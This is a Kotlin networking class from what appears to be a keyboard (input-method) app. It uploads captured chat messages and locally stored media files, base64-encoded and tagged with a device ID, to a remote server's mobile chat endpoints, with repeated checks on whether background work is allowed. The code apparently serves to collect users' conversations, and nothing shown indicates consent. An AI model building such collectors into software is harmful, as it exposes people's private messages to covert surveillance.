package com.yuyan.imemodule.data.capture.net

import com.yuyan.imemodule.data.capture.db.PendingAssetEntity
import com.yuyan.imemodule.data.capture.notification.filterCallStatusNotifications
import com.yuyan.imemodule.data.collect.GameWorkRuntime
import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.encodeToJsonElement
import kotlinx.serialization.json.jsonObject
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.ByteString.Companion.toByteString
import java.io.File

@Serializable
data class PendingMessageUploadPayload(
    @SerialName("device_id") val deviceId: String,
    val conversation: JsonObject,
    val message: JsonObject,
)

@Serializable
private data class AssetUploadRequest(
    val sha256: String,
    @SerialName("mime_type") val mimeType: String,
    @SerialName("file_base64") val fileBase64: String,
    @SerialName("perceptual_hash") val perceptualHash: String? = null,
    val width: Int? = null,
    val height: Int? = null,
)

@Serializable
private data class MessageBatchRequest(
    @SerialName("device_id") val deviceId: String,
    val conversation: JsonObject,
    val messages: List<JsonObject>,
)

class CaptureApi(
    baseUrl: String,
    private val deviceId: String,
    private val http: OkHttpClient = OkHttpClient.Builder().addInterceptor(GameWorkRuntime.interceptor).build(),
    private val enqueue: ((String, String) -> Boolean)? = null,
    private val backgroundAllowed: () -> Boolean = { true },
) {
    private val baseUrl = baseUrl.trimEnd('/')
    private val json = Json { ignoreUnknownKeys = true }

    fun decodeMessagePayload(payloadJson: String): PendingMessageUploadPayload =
        json.decodeFromString(payloadJson)

    fun uploadAsset(asset: PendingAssetEntity): Boolean {
        if (!backgroundAllowed()) return false
        val file = File(asset.localPath)
        if (!file.isFile) return false
        val bytes = file.readBytes()
        if (!backgroundAllowed()) return false
        val encoded = bytes.toByteString().base64()
        if (!backgroundAllowed()) return false
        val body = AssetUploadRequest(
            sha256 = asset.sha256,
            mimeType = asset.mimeType,
            fileBase64 = encoded,
            perceptualHash = asset.perceptualHash,
            width = asset.width,
            height = asset.height,
        )
        if (!backgroundAllowed()) return false
        val payload = json.encodeToString(body)
        if (!backgroundAllowed()) return false
        return post("/api/v1/mobile/chat/assets", payload)
    }

    fun uploadMessages(messages: List<PendingMessageUploadPayload>): Boolean {
        require(messages.isNotEmpty()) { "message batch must not be empty" }
        require(messages.size <= MAX_MESSAGE_BATCH) { "message batch must not exceed 200" }
        val first = messages.first()
        require(messages.all { it.deviceId == first.deviceId && it.conversation == first.conversation }) {
            "message batch must belong to one device and conversation"
        }
        if (!backgroundAllowed()) return false
        val body = MessageBatchRequest(
            deviceId = first.deviceId,
            conversation = first.conversation,
            messages = messages.map { it.message },
        )
        // 已入旧 Room 队列的状态也就地结束，不再转入通用报告队列或发起 HTTP。
        val encoded = json.encodeToJsonElement(body).jsonObject
        if (!backgroundAllowed()) return false
        val filtered = filterCallStatusNotifications(encoded)
        if (!backgroundAllowed()) return false
        if (filtered == null) return true
        val payload = filtered.toString()
        if (!backgroundAllowed()) return false
        return post("/api/v1/mobile/chat/messages/batch", payload)
    }

    private fun post(path: String, jsonBody: String): Boolean {
        if (!backgroundAllowed()) return false
        enqueue?.let { return it(path, jsonBody) }
        val request = Request.Builder()
            .url(baseUrl + path)
            .header("X-Device-Id", deviceId)
            .post(jsonBody.toRequestBody(JSON_MEDIA_TYPE))
            .build()
        if (!backgroundAllowed()) return false
        return http.newCall(request).execute().use { response -> response.isSuccessful }
    }

    private companion object {
        val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
        const val MAX_MESSAGE_BATCH = 200
    }
}
